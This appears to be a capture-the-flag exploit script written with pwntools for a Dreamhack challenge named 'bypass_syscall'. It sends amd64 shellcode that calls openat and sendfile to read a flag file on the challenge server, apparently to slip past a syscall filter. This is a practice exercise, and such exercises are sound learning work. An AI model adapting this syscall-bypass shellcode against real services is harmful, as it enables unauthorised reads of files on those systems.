from pwn import *
context(arch='amd64')

REMOTE = True

if not REMOTE:
    r = process('./bypass_syscall')
else:
    r = remote('host1.dreamhack.games', 22734)

shellcode = shellcraft.openat(0, '/home/bypass_syscall/flag')
shellcode += shellcraft.sendfile(1, 'rax', 0, 100)
shellcode = asm(shellcode)

r.sendafter('shellcode: ', shellcode)

r.interactive()